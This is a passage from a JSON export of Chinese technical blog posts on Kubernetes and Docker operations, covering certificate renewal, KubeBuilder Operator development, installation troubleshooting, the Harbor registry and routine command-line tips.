的 CPU 利用率，动态伸缩数量\n1 kubectl autoscale deployment/nginx --min=1 --max=5 --cpu-percent=80 ","description":"","id":348,"section":"post","tags":["博文","Kubernetes","Deployment"],"title":"Kubernetes 中 Deployment 的基本操作","uri":"https://www.chenshaowen.com/blog/basic-operation-of-deployment-in-kubernetes.html"},{"content":" 我使用的是 Kubernetes 1.15.3 ，不同版本的处理方法可能会有不同。\n1. 关于证书 根证书是自签的 根证书是由自己签发的。在浏览器中，内置了常见的证书服务商的 CA 证书。因此，浏览器才会信任这些证书服务商签发的下一级证书。\n我们也可以生成根证书，但是需要将根证书添加到系统信任证书列表中。这样，我们就可以给自己签发证书。\n证书是有层级的 证书的签发是一条信任链。根 CA 签发子 CA ，子 CA 签发终端用户。通常为了减轻根 CA 证书的签发压力，会生成一定层级的中间 CA ，用于分层管理证书的签发。\n证书是信任凭证 证书分为 DV、OV、EV。它们使用相同的加密算法，但提供不同的信任等级。这里的信任不是指技术，而是指签发对象。等级越高的证书，对签发对象验证越严格。因证书导致损失，赔偿额度越高。\n2. Kubernetes 中的证书 证书认证分为单向和双向。\n单向认证只需要服务器端自证身份，比如浏览器访问服务器，而双向认证需要服务器和客户端互证身份，比如后台的点对点通信。\nKubernetes 的核心组件采取的是双向认证机制，客户端和服务器同时持有证书。\nKubernetes 中常见的证书信任链：\n/etc/kubernetes/pki/ca 签发证书\n/etc/kubernetes/pki/apiserver /etc/kubernetes/pki/apiserver-kubelet-client /etc/kubernetes/pki/front-proxy-ca 签发证书\n/etc/kubernetes/pki/front-proxy-client /etc/kubernetes/pki/etcd/ca 签发证书\n/etc/kubernetes/pki/etcd/server /etc/kubernetes/pki/etcd/peer /etc/kubernetes/pki/etcd/healthcheck-client /etc/kubernetes/pki/apiserver-etcd-client /etc/kubernetes/pki/sa 用于 Serveice Account 的认证。\n3. 续签 Kubernetes 证书 Kubeadm 创建的 Kubernetes 集群， apiserver、controller-manager、kubelete 等组件的证书默认有效期只有一年。\n官方推荐一年之内至少用 Kubeadm 更新一次 Kubernetes 版本，自动更新证书。\n查看根 CA 证书的有效期，默认为 10 年： 1 2 cd /etc/kubernetes/pki ls | grep ca.crt | xargs -I {} openssl x509 -text -in {} | grep \u0026#34;Not After\u0026#34; 查看当前证书有效期 1 kubeadm alpha certs check-expiration 重新签发证书 续签全部证书\n1 kubeadm alpha certs renew all 也可以局部进行续签 apiserver-etcd-client 、apiserver-kubelet-client、apiserver、etcd-healthcheck-client、etcd-peer、etcd-server、front-proxy-client\n1 kubeadm alpha certs renew apiserver-etcd-client 4. 更新 apiserver 证书域名或 IP 来源 如果 Master 节点的 IP 发生了漂移或者希望通过指定域名访问集群，就需要对 apiserver 证书进行更新，分为如下几步：\n生成 Kubeadm 的配置文件 1 kubectl -n kube-system get configmap kubeadm-config -o jsonpath=\u0026#39;{.data.ClusterConfiguration}\u0026#39; \u0026gt; kubeadm.yaml 在 kubeadm.yaml 文件中，apiServer 增加 certSANs 字段指定证书包含的 IP 和域名 1 2 3 4 apiServer: certSANs: - \u0026#34;1.23.45.67\u0026#34; - \u0026#34;yourdomain.com\u0026#34; 备份证书 1 mv /etc/kubernetes/pki/apiserver.{crt,key} ~ 生成新的 apiserver 证书 1 kubeadm init phase certs apiserver --config kubeadm.yaml 重启 apiserver ，直接重启 Pod 并不会生效 首先拿到 apiserver 的 CONTAINER_ID ，然后 kill 掉，系统会自动拉起 apiserver。\n1 2 docker ps | grep kube-apiserver | grep -v pause docker kill {CONTAINER_ID} 5. 参考 https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm-alpha/ https://blog.scottlowe.org/2019/07/30/adding-a-name-to-kubernetes-api-server-certificate/ ","description":"","id":349,"section":"post","tags":["博文","Kubernetes","证书"],"title":"Kubernetes 中的证书","uri":"https://www.chenshaowen.com/blog/certificates-in-kubernetes.html"},{"content":" 通过 Operator 的方案，可以对 Kubernetes 的功能进行友好地扩展。Operatpr = CRD + Controller。首先通过 yaml 定义，生成 CRD ，然后 Controller 不断地监听 etcd 中的数据，执行相应动作。开发 Operator 时，有很多繁琐且重复的事情。KubeBuilder 可以帮助我们快速生成骨架代码，开发一个 Kubernetes 的扩展功能， 更多介绍可以参考文档：Kubernetes 复杂有状态应用管理框架 \u0026ndash; Operator 。本篇文档，主要是尝试使用 KubeBuilder 开发一个 Operator 。\n1. 环境准备 Go 开发环境\n远程 Kubernetes 环境\n我准备的是，单节点 Kubernetes 1.15.3 。\n本地 Kubectl 访问远程集群的权限 将集群 /etc/kubernetes/admin.conf 拷贝到本地 ~/.kube/config 即可。\n2. Hello，Kubebuilder 2.1 安装 kubebuilder、kustomize 以 OS X 为例，当前 kubebuilder 版本为 2.x :\n1 2 brew install kubebuilder brew install kustomize 2.2 初始化项目 1 2 3 4 export GOPATH=$(go env GOPATH) mkdir -p $GOPATH/src/github.com/kube-api cd $GOPATH/src/github.com/kube-api kubebuilder init --domain k8s.chenshaowen.com --license apache2 --owner \u0026#34;chenshaowen\u0026#34; 初始化工程之后，KubeBuilder 会生成一系列配置和代码框架。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 tree -L 3 . ├── Dockerfile ├── Makefile ├── PROJECT ├── bin │ └── manager ├── config │ ├── certmanager │ │ ├── certificate.yaml │ │ ├── kustomization.yaml │ │ └── kustomizeconfig.yaml │ ├── default │ │ ├── kustomization.yaml │ │ ├── manager_auth_proxy_patch.yaml │ │ ├── manager_prometheus_metrics_patch.yaml │ │ ├── manager_webhook_patch.yaml │ │ └── webhookcainjection_patch.yaml │ ├── manager │ │ ├── kustomization.yaml │ │ └── manager.yaml │ ├── rbac │ │ ├── auth_proxy_role.yaml │ │ ├── auth_proxy_role_binding.yaml │ │ ├── auth_proxy_service.yaml │ │ ├── kustomization.yaml │ │ ├── leader_election_role.yaml │ │ ├── leader_election_role_binding.yaml │ │ └── role_binding.yaml │ └── webhook │ ├── kustomization.yaml │ ├── kustomizeconfig.yaml │ └── service.yaml ├── go.mod ├── go.sum ├── hack │ └── boilerplate.go.txt └── main.go 8 directories, 28 files 2.3. 新增 API 1 2 3 4 5 6 kubebuilder create api --group groupa --version v1beta1 --kind ApiExampleA Create Resource [y/n] y Create Controller [y/n] y ...... KubeBuilder 会将 CRD 和 Controller 添加到工程中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 tree -L 3 . ├── Dockerfile ├── Makefile ├── PROJECT # 新增 resources 部分 ├── api │ └── v1beta1 # 新增 API 描述 │ ├── apiexamplea_types.go │ ├── groupversion_info.go │ └── zz_generated.deepcopy.go ├── bin │ └── manager ├── config │ ├── certmanager │ │ ├── certificate.yaml │ │ ├── kustomization.yaml │ │ └── kustomizeconfig.yaml │ ├── crd # 新增 CRD 定义 │ │ ├── kustomization.yaml │ │ ├── kustomizeconfig.yaml │ │ └── patches │ ├── default │ │ ├── kustomization.yaml │ │ ├── manager_auth_proxy_patch.yaml │ │ ├── manager_prometheus_metrics_patch.yaml │ │ ├── manager_webhook_patch.yaml │ │ └── webhookcainjection_patch.yaml │ ├── manager │ │ ├── kustomization.yaml │ │ └── manager.yaml │ ├── rbac │ │ ├── auth_proxy_role.yaml │ │ ├── auth_proxy_role_binding.yaml │ │ ├── auth_proxy_service.yaml │ │ ├── kustomization.yaml │ │ ├── leader_election_role.yaml │ │ ├── leader_election_role_binding.yaml │ │ └── role_binding.yaml │ ├── samples # 新增创建 CRD 对象示例 │ │ └── groupa_v1beta1_apiexamplea.yaml │ └── webhook │ ├── kustomization.yaml │ ├── kustomizeconfig.yaml │ └── service.yaml ├── controllers # 新增 Controller │ ├── apiexamplea_controller.go │ └── suite_test.go ├── go.mod # 新增依赖包 ├── go.sum ├── hack │ └── boilerplate.go.txt └── main.go # 新增处理逻辑 14 directories, 36 files 2.4 修改配置，适配国内环境 在容器中进行编译时，由于国内网络问题，会导致拉取不到 Go 依赖包和依赖镜像，需要修改 Dockerfile 文件。\n增加 GO 代理 修改镜像源 1 git diff Dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 @@ -7,7 +7,7 @@ COPY go.mod go.mod COPY go.sum go.sum # cache deps before building and copying source so that we don\u0026#39;t need to re-download as much # and so that source changes don\u0026#39;t invalidate our downloaded layer -RUN go mod download +RUN GOPROXY=https://gocenter.io go mod download # Copy the go source COPY main.go main.go @@ -19,7 +19,7 @@ RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 GO111MODULE=on go build -a -o manager # Use distroless as minimal base image to package the manager binary # Refer to https://github.com/GoogleContainerTools/distroless for more details -FROM gcr.io/distroless/static:latest +FROM gcr.azk8s.cn/distroless/static:latest WORKDIR / COPY --from=builder /workspace/manager . ENTRYPOINT [\u0026#34;/manager\u0026#34;] 2.5. 构建并推送镜像测试 本地构建并推送镜像 由于使用的是远程 Kubernetes 环境，需要借助镜像仓库进行部署。\n修改镜像名称 1 git diff Makefile 1 2 3 4 5 6 7 @@ -1,6 +1,6 @@ # Image URL to use all building/pushing image targets -IMG ?= controller:latest +IMG ?= docker.io/shaowenchen/controller:latest # Produce CRDs that work back to Kubernetes 1.11 (no version conversion) CRD_OPTIONS ?= \u0026#34;crd:trivialVersions=true\u0026#34; 登陆 docker.io 的镜像仓库 1 2 3 docker login docker.io -u shaowenchen Password: Login Succeeded 构建并推送镜像 1 make docker-build \u0026amp; make docker-push 也可以通过，在执行 make docker-build 等命令时，增加 IMG 变量修改镜像名称。\n部署到 Kubernetes 安装 kustomize 1 brew install kustomize 部署 CRD 1 make install 查看 CRD 1 2 3 kubectl get crd NAME CREATED AT apiexampleas.groupa.k8s.chenshaowen.com 2019-09-24T07:24:45Z 部署 Controller 1 make deploy 查看 deployment 1 2 3 kubectl get deploy -n kube-api-system NAME READY UP-TO-DATE AVAILABLE AGE kube-api-controller-manager 1/1 1 1 46s 创建 CRD 对象 1 kubectl apply -f config/samples/groupa_v1beta1_apiexamplea.yaml 查看 CRD 对象 1 2 3 4 kubectl get apiexampleas.groupa.k8s.chenshaowen.com NAME AGE apiexamplea-sample 61s 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl get apiexampleas.groupa.k8s.chenshaowen.com apiexamplea-sample -o yaml apiVersion: groupa.k8s.chenshaowen.com/v1beta1 kind: ApiExampleA metadata: annotations: kubectl.kubernetes.io/last-applied-configuration: | {\u0026#34;apiVersion\u0026#34;:\u0026#34;groupa.k8s.chenshaowen.com/v1beta1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;ApiExampleA\u0026#34;,\u0026#34;metadata\u0026#34;:{\u0026#34;annotations\u0026#34;:{},\u0026#34;name\u0026#34;:\u0026#34;apiexamplea-sample\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;default\u0026#34;},\u0026#34;spec\u0026#34;:{\u0026#34;foo\u0026#34;:\u0026#34;bar\u0026#34;}} creationTimestamp: \u0026#34;2019-09-24T07:29:16Z\u0026#34; generation: 1 name: apiexamplea-sample namespace: default resourceVersion: \u0026#34;635450\u0026#34; selfLink: /apis/groupa.k8s.chenshaowen.com/v1beta1/namespaces/default/apiexampleas/apiexamplea-sample uid: 05398ab4-7d4a-4f2e-af30-b59e61680c7e spec: foo: bar 3. 在 Project 中写入逻辑 通过上面的操作，我们新增了 Kubernetes 对象类型 apiexampleas.groupa.k8s.chenshaowen.com （ApiExampleA），并实例化对象进行操作。\n这些操作仅仅只是对 etcd 数据的操作，没有触发有效动作。下面，尝试往工程中注入一点自定义逻辑。实现一个简单的功能：给自定义的 CRD 增加两个字段，FirstName、SecondName ；创建对象时，在 Controller 中获取这两个字段，并输出到日志中。\n修改代码 增加 CRD 字段 在 api/v1beta1/apiexamplea_types.go 文件 ApiExampleASpec 结构体中增加两个字段：\n1 2 3 4 5 6 type ApiExampleASpec struct { // INSERT ADDITIONAL SPEC FIELDS - desired state of cluster // Important: Run \u0026#34;make\u0026#34; to regenerate code after modifying this file FirstName string `json:\u0026#34;firstname\u0026#34;` // add SecondName string `json:\u0026#34;secondname\u0026#34;` // add } 增加 Controller 逻辑 首先在 import 中新增 log 包：\n1 2 3 import ( \u0026#34;log\u0026#34; // add ... 然后在 Reconcile 函数中，处理逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func (r *ApiExampleAReconciler) Reconcile(req ctrl.Request) (ctrl.Result, error) { // _ = context.Background() // _ = r.Log.WithValues(\u0026#34;apiexamplea\u0026#34;, req.NamespacedName) // // your logic here // return ctrl.Result{}, nil ctx := context.Background() _ = r.Log.WithValues(\u0026#34;apiexamplea\u0026#34;, req.NamespacedName) obja := \u0026amp;groupav1beta1.ApiExampleA{} if err := r.Get(ctx, req.NamespacedName, obja); err != nil { log.Println(err, \u0026#34;unable to fetch New Object\u0026#34;) } else { log.Println(\u0026#34;fetch New Object:\u0026#34;, obja.Spec.FirstName, obja.Spec.SecondName) } return ctrl.Result{}, nil } 修改镜像 tag 修改镜像 tag 是为了远程 Kubernetes 集群远程部署 Deployment 时，能够重新拉取镜像，使用指定的镜像进行部署。\n修改 Makefile 文件中的变量 IMG 为：IMG ?= docker.io/shaowenchen/controller:1\n构建发布 1 make \u0026amp; make docker-build \u0026amp; make docker-push 部署 1 make deploy 生成一个 CRD 对象实例 在 config/samples/groupa_v1beta1_apiexamplea.yaml 文件中修改 name 值，并在 spec 字段新增两个字段：\n1 2 3 4 5 6 7 8 9 apiVersion: groupa.k8s.chenshaowen.com/v1beta1 kind: ApiExampleA metadata: name: apiexamplea-sample2 spec: # Add fields here # foo: bar firstname: shaowen secondname: chen 创建 CRD 对象\n1 kubectl create -f config/samples/groupa_v1beta1_apiexamplea.yaml 查看 Controller 的 Pod Name\n1 2 3 kubectl get pod -n kube-api-system NAME READY STATUS RESTARTS AGE kube-api-controller-manager-7d8bb9fc6f-8bmg9 2/2 Running 0 22m 查看创建日志\n1 2 3 4 5 6 7 8 9 kubectl logs kube-api-controller-manager-7d8bb9fc6f-8bmg9 -c manager -n kube-api-system 2019-09-25T07:09:51.124Z\tINFO\tcontroller-runtime.metrics\tmetrics server is starting to listen\t{\u0026#34;addr\u0026#34;: \u0026#34;127.0.0.1:8080\u0026#34;} 2019-09-25T07:09:51.216Z\tINFO\tcontroller-runtime.controller\tStarting EventSource\t{\u0026#34;controller\u0026#34;: \u0026#34;apiexamplea\u0026#34;, \u0026#34;source\u0026#34;: \u0026#34;kind source: /, Kind=\u0026#34;} 2019-09-25T07:09:51.217Z\tINFO\tsetup\tstarting manager 2019-09-25T07:09:51.217Z\tINFO\tcontroller-runtime.manager\tstarting metrics server\t{\u0026#34;path\u0026#34;: \u0026#34;/metrics\u0026#34;} 2019-09-25T07:10:08.111Z\tINFO\tcontroller-runtime.controller\tStarting Controller\t{\u0026#34;controller\u0026#34;: \u0026#34;apiexamplea\u0026#34;} 2019-09-25T07:10:08.111Z\tDEBUG\tcontroller-runtime.manager.events\tNormal\t{\u0026#34;object\u0026#34;: {\u0026#34;kind\u0026#34;:\u0026#34;ConfigMap\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;kube-api-system\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;controller-leader-election-helper\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;bf307b9a-829f-478e-9306-68b6c47671fa\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;resourceVersion\u0026#34;:\u0026#34;871886\u0026#34;}, \u0026#34;reason\u0026#34;: \u0026#34;LeaderElection\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;kube-api-controller-manager-7d8bb9fc6f-8bmg9_77815cc0-df63-11e9-b8c4-e6f6cfac380f became leader\u0026#34;} 2019-09-25T07:10:08.211Z\tINFO\tcontroller-runtime.controller\tStarting workers\t{\u0026#34;controller\u0026#34;: \u0026#34;apiexamplea\u0026#34;, \u0026#34;worker count\u0026#34;: 1} 2019/09/25 07:10:08 fetch New Object: shaowen chen 4. 参考 https://book.kubebuilder.io/ ","description":"","id":350,"section":"post","tags":["博文","Kubernetes","Go","Operator"],"title":"如何使用 KubeBuilder 开发一个 Operator","uri":"https://www.chenshaowen.com/blog/how-to-develop-a-operator-using-kubebuilder.html"},{"content":"1. CNI 问题 错误日志\n1 2 journalctl -u kubelet ...Unable to update cni config: No networks found in /etc/cni/net.d 由于没有安装 CNI ，需要移除 /var/lib/kubelet/kubeadm-flags.env 参数中的--network-plugin=cni\n1 2 cat /var/lib/kubelet/kubeadm-flags.env KUBELET_KUBEADM_ARGS=\u0026#34;--cgroup-driver=systemd --pod-infra-container-image=k8s.gcr.io/pause:3.1\u0026#34; 2. 节点 NotReady 节点 NotReady 可能的原因有很多。通常会是网络、容器配置错误导致，需要逐一排查。\n这里使用的是 使用 Kubeadm 安装 Kubernetes 集群\n文档的安装步骤。\n最后分析原因是 Kubelet 的 cgroupDriver 与 Docker 不一致导致 NotReady。\nKubelet 的配置文件在 /var/lib/kubelet/config.yaml 。修改：\n1 cgroupDriver: systemd 与 Docker 的配置文件 /etc/docker/daemon.json 一致即可：\n1 2 3 { \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;] } 3. Helm init 找不到请求资源 具体报错信息：\n1 2 3 helm init --service-account tiller ... Error: error installing: the server could not find the requested resource 原因：\nhelm v2.14.3 不兼容 Kubernetes 1.16.0 的 apiVersion 。\n解决办法：\n1 helm init --output yaml \u0026gt; tiller.yaml 更新 tiller.yaml 两处：\napiVersion 版本 增加选择器 1 2 3 4 5 6 7 8 9 10 apiVersion: apps/v1 kind: Deployment ... spec: replicas: 1 strategy: {} selector: matchLabels: app: helm name: tiller 创建 tiller\n1 kubectl create -f tiller.yaml 参考链接，Github Issues 。\n","description":"","id":351,"section":"post","tags":["博文","Kubernetes","安装"],"title":"Kubernetes 1.6.0 安装问题汇总","uri":"https://www.chenshaowen.com/blog/summary-of-installation-problems-for-kubernetes-1.6.0.html"},{"content":"1. 搭建 Harbor 的要求 Harbor 硬件要求：\nCPU，最少 2 核，4 核更好 Mem，最少 4 GB，8 GB 更好 Disk，最少 40 GB，160 GB 更好 Docker 版本要求：\n17.06.0 以上 在 Kubernetes 上搭建 Harbor ，可以参考文档，使用 Helm 搭建 harbor 。\n2. Harbor 提供的功能 Harbor 是在 Docker Registry 的基础之上，进行了企业级扩展。Harbor 提供的功能包括：\n基于角色的权限控制 基于策略的镜像复制 漏洞扫描 LDAP 认证 镜像垃圾清理 Notary 镜像签名 操作日志 RESTful API Chart 包的管理 3. Harbor 集成的组件 3.1 Clair Clair 是 CoreOS 开源的镜像漏洞扫描工具。\nClair 的原理是，首先对镜像进行特征的提取，再将这些特征匹配 CVE 漏洞库。Clair 是以静态的方式，按照镜像 layer 层级，进行扫描的。\n3.2 Notray 在构建镜像时，通常会基于一些基础镜像，添加符合应用场景的镜像层，得到新的镜像。为了防止在构建过程中，非法植入恶意镜像层，便有了内容信任（Content Trust）机制，用以保证镜像层来源可信。\nNotary 是一套镜像的签名工具， 用来保证镜像层在 pull、push、transfer 过程中的一致性和完整性。避免中间人攻击，阻止非法的镜像更新和运行。\n镜像层的创建者可以对镜像层做数字签名，生成摘要，保存在 Notary 服务中。开启 Content Trust 机制之后，未签名的镜像无法被拉取。\n通过设置环境变量，可以开启 Content Trust 机制：\nexport DOCKER_CONTENT_TRUST=1 export DOCKER_CONTENT_TRUST_SERVER=https://notary.harbor.chenshaowen.com 推、拉镜像时，要求镜像层有签名：\n1 2 3 docker pull core.harbor.chenshaowen.com/shaowenchen/devops-python-sample:31 Error: remote trust data does not exist for core.harbor.chenshaowen.com/shaowenchen/devops-python-sample: core.harbor.chenshaowen.com does not have trust data for core.harbor.chenshaowen.com/shaowenchen/devops-python-sample 1 2 3 4 5 6 7 8 docker push core.harbor.chenshaowen.com/shaowenchen/kube-apiserver:v1.15.3 The push refers to repository [core.harbor.chenshaowen.com/shaowenchen/kube-apiserver] 9b49e894f11a: Layer already exists fe9a8b4f1dcc: Layer already exists v1.15.3: digest: sha256:a21bcbcd23f7dbc6a331583645b56e639ec256cc6e2283a647ddd86505a4783e size: 741 Signing and pushing trust metadata Enter passphrase for root key with ID dc948ea: 3.3 Docker Registry Docker Registry 是 Docker 官方提供的镜像存储组件。\nregistry v2 拥有断点续传、镜像多层并发拉取等功能。\n当 pull 一个镜像时，先进行认证，获取到 token 并授权通过，然后获取镜像的 manifest 文件，进行 signature 校验。校验完成之后，依据 manifest 包含的信息，拉取各层。拉取完成后，也需要先在本地进行校验。\n当 push 一个镜像时，先将镜像各层并发推送至 registry ，推送完成后，再将镜像的 manifest 推至 registry。\n在 registry 的存储目录下，能够找到两个文件夹：一个是 blobs，用于存储层级文件；另外一个是 repositories，以索引的方式保存了 registry 中镜像的元数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 tree -L 6 . `-- docker `-- registry `-- v2 |-- blobs | `-- sha256 ... | `-- ff `-- repositories |-- library | `-- kube-proxy `-- shaowenchen |-- devops-python-sample |-- docker-robotframework `-- zing-gallery 4. Kubernetes 中的 Harbor 上面是 Harbor 的架构图。下面根据 Kubernetes 中运行的 Pod 了解一下 Harbor 中的相关模块：\n1 2 3 4 5 6 7 8 9 10 11 12 13 kubectl get pod -n harbor NAME READY STATUS RESTARTS AGE harbor-harbor-chartmuseum-6b94bdff69-2n885 1/1 Running 2 96m harbor-harbor-clair-5bd8f76d9c-crjqj 1/1 Running 6 96m harbor-harbor-core-599747cd9b-vbhv5 1/1 Running 7 96m harbor-harbor-database-0 1/1 Running 2 96m harbor-harbor-jobservice-54686b9f7-dpvms 1/1 Running 8 96m harbor-harbor-notary-server-85b5587c5-tkntx 1/1 Running 1 96m harbor-harbor-notary-signer-7b67669b7f-q2qkl 1/1 Running 2 96m harbor-harbor-portal-64cff84747-tbmdp 1/1 Running 2 96m harbor-harbor-redis-0 1/1 Running 2 96m harbor-harbor-registry-555c545d5b-gmzg5 2/2 Running 3 96m chartmuseum， chart 存储，在挂载的 PV 中可以看到以文件目录形式存储的 chart 包。 clair，用于镜像安全扫描 core，核心功能控制 database，用于存储 projects、users、roles、images 等元数据。 jobservice，执行定时任务，提供 API 供外部提交任务及查询执行结果。 notary-server、notary-signer，实现 Docker Content Trust ，镜像签名。 portal，UI 页面入口 redis，缓存 registry，Docker 的原生 registry 组件 5. HA 方案 多主复制 通过一个 LB ，将请求导向多个 Harbor 实例上。这种方式不能保证数据的一致性，在生产环境常会遇到问题。\n多实例，共享存储 同样是，通过一个 LB ，将请求导向多个 Harbor 实例。但是全部实例共享存储，只需要存储是高可用，那么整个 Harbor 集群也就高可用了。\n6. Harbor 的一些问题 2022.07 新增\n任务队列慢 使用 Harbor 进行主从复制时，Harbor 的任务执行非常慢。如上图，日常推送不到 2K，而任务堆积了 5.7K，根本无法作为生产的同步方案使用。\n主从 Harbor 的直接同步是不可行的，如果借助第三方工具或可一试。\nTrivy 扫描不可用 我们采用的是 4C8GB 机器使用 docker compose 部署 Harbor。Harbor 有两种安全扫描自动触发方式:\n- 上传镜像之后扫描。导致任务堆积，需要等十几个小时才能执行。 - 定时扫描。如上图，每次扫描时，内存不断增长，CPU 间歇性拉高，直至达到接近 98% 消耗，影响机器稳定性。而且，之前扫描过的镜像，第二次依然会扫描，无法控制资源消耗。 因此，建议采用外置的 Trivy 镜像安全扫描器，同时分散到多个实例进行扫描。\n任务执行机制缺陷 在基于 Kubernetes 的一个 Harbor 实例上，增加 Job Service 的副本数量不能显著提升任务的执行速度。\n同时，在页面上取消的任务并不能马上取消，而是需要删掉 Redis 中的数据。如果采用的是无状态的 Redis，可以重启 Redis 取消任务。\n7. 参考 https://goharbor.io/docs/ ","description":"","id":352,"section":"post","tags":["整理","Harbor","镜像","容器"],"title":"镜像管理工具 -- Harbor","uri":"https://www.chenshaowen.com/blog/an-enterprise-class-registry-of-harbor.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Ingress 开启 HTTPS 准备好证书，domain.com.crt、domain.com.key\n创建 Secret 1 kubectl create secret tls {SECRET_NAME} --key domain.com.key --cert domain.com.crt -n {NAMESPACE} 更新 Ingress 配置 1 2 3 4 5 spec: tls: - hosts: - domain.com secretName: {SECRET_NAME} 2. SSH 登陆失败，提示 ssh-dss SSH 登陆提示:\n1 Unable to negotiate with 10.10.10.10 port 22: no matching host key type found. Their offer: ssh-dss 原因是，OpenSSH 7.0 以后的版本，出于安全性考虑，不再支持 ssh-dss (DSA)算法。\n执行命令，查看 OpenSSH 版本：\n1 sshd -V 解决办法，有两个：\n1，命令行添加参数\n1 ssh -oHostKeyAlgorithms=+ssh-dss login_user@host_ip 2，配置文件中增加参数\ncat ~/.ssh/config Host ssh_name HostName host_ip HostKeyAlgorithms +ssh-dss User login_user Port 22 3. 强制删除 Kubernetes 资源 使用 --force 删除 1 kubectl delete --force --grace-period=0 {RESOURCE_NAME} 修改 finalizers 通常无法删除，是因为有些 finalizer 关联的动作未执行成功。如果一定要删除，可以试试下面的命令:\n1 kubectl get namespace myns -o json | tr -d \u0026#34;\\n\u0026#34; | sed \u0026#34;s/\\\u0026#34;finalizers\\\u0026#34;: \\[[^]]\\+\\]/\\\u0026#34;finalizers\\\u0026#34;: []/\u0026#34;| kubectl replace /api/v1/namespaces/myns/finalize -f - 在 etcd 中删除 1 yum install -y etcd 1 ETCDCTL_API=3 etcdctl --endpoints=https://[127.0.0.1]:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key del --prefix=/registry/namespaces/{NAMESPACENAME} 4. 使用 Journalctl 查看日志 Systemd 是 Linux 系统工具，用来启动守护进程。journald 收集由内核、initrd 以及服务等产生的日志信息。\n只需要 journalctl 一条命令，就可以查看所有日志。\n查看所有日志 1 journalctl 实时滚动显示日志 1 journalctl -f 查看指定服务日志 1 journalctl -u kubelet ","description":"","id":353,"section":"post","tags":["博文","Tips","Kubernetes","Ingress"],"title":"开发 Tips（15）","uri":"https://www.chenshaowen.com/blog/developing-tips-15.html"},{"content":"1. docker pull 拉取镜像 使用 docker pull {IMAGE_NAME} 拉取镜像时，有两种情况:\nIMAGE_NAME 前缀指向 registry Docker 会将 IMAGE_NAME 识别为指定仓库提供的镜像。例如，myregistry.io/space1/image1:latest ，Docker 会去 myregistry.io 指向的服务器请求镜像数据。一个 Docker 镜像分为很多层，如果本地存在该层，则不会再次拉取。\nIMAGE_NAME 前缀不包含 registry Docker 会将 IMAGE_NAME 识别为 docker.io/IMAGE_NAME 请求镜像数据。事实上，docker pull docker.io/shaowenchen/images1 与 docker pull shaowenchen/images1 同等效果。对于 DockerHub 提供的镜像，国内访问速度较慢，可以通过添加镜像源的方式加速。\n在拉取镜像时，可能会有两个问题：\n1，拉取非公开镜像，提示登录\n直接使用 docker login 登录即可，在非交互场景，可以执行：\n1 echo \u0026#34;$DOCKER_PASSWORD\u0026#34; | docker login $REGISTRY -u \u0026#34;$DOCKER_USERNAME\u0026#34; --password-stdin 2，镜像仓库证书错误\n如果 IMAGE_NAME 中指定了镜像仓库服务器，但服务器并不提供合法的 https 服务，那么需要进行如下配置：\n在 /etc/docker/daemon.json 文件中，增加：\n{ \u0026#34;insecure-registries\u0026#34;: [\u0026#34;core.harbor.chenshaowen.com:5000\u0026#34;] } 重启 Docker 生效。\n2. 修改镜像源，加速镜像拉取 修改 Docker 的配置文件 daemon.json 在 /etc/docker/daemon.json 文件中，增加镜像源\n1 2 3 { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://docker.mirrors.ustc.edu.cn\u0026#34;] } 修改 Docker 的 systemd 参数 编辑文件 /usr/lib/systemd/system/docker.service ，在 ExecStart 所在行，增加 registry-mirror 参数。\n1 ExecStart=... --registry-mirror=https://docker.mirrors.ustc.edu.cn 重启 Docker 生效。\n","description":"","id":354,"section":"post","tags":["博文","Docker","镜像"],"title":"Docker 如何拉取镜像","uri":"https://www.chenshaowen.com/blog/how-docker-pull-images.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Kubernetes 集群添加新的 Node 节点 在执行 kubeadm init 时，Console 会打印添加 Node 的命令。Token 默认的有效期为 24h 。当超过有效期时，需要重新创建 Token ，执行命令：\n1 2 kubeadm token create --print-join-command kubeadm join 192.168.10.2:6443 --token ocyzce.3hv8y7w60lrvulir --discovery-token-ca-cert-hash sha256:7a86632f54de1004bb3f38124b663f837399d6ba9aa803d58c6707a76c02a6cb 使用 Console 输出的命令，即可将 Node 节点添加到集群。\n2. 控制 Node 节点的调度 允许调度 Pod 1 kubectl uncordon {NODE_NAME} 禁止调度 Pod 1 kubectl cordon {NODE_NAME} 3. 查看 CentOS 端口占用 使用 lsof 1 2 yum install -y lsof lsof -i:30948 使用 netstat 1 2 yum install -y net-tools netstat -apn | grep 30948 4. tcpdump 查看指定端口、指定 IP 来源数据 1 2 yum install -y tcpdump tcpdump -i eth0 -nnA \u0026#39;port 30948 and src host 192.168.10.3\u0026#39; -vv ","description":"","id":355,"section":"post","tags":["博文","Tips","Kubernetes","CentOS","Tcpdump"],"title":"开发 Tips（14）","uri":"https://www.chenshaowen.com/blog/developing-tips-14.html"},{"content":" 前提准备，（1）已经安装 Helm ，参考 Helm 安装 ，（2）集群有默认的动态存储可用，参数 使用StorageClass提供PV动态存储\n1. 使用 Helm 安装 Ingress Ingress 由 Ingress 和 Ingress Controller 两部分组成。\n在 Kubernetes 中，Ingress 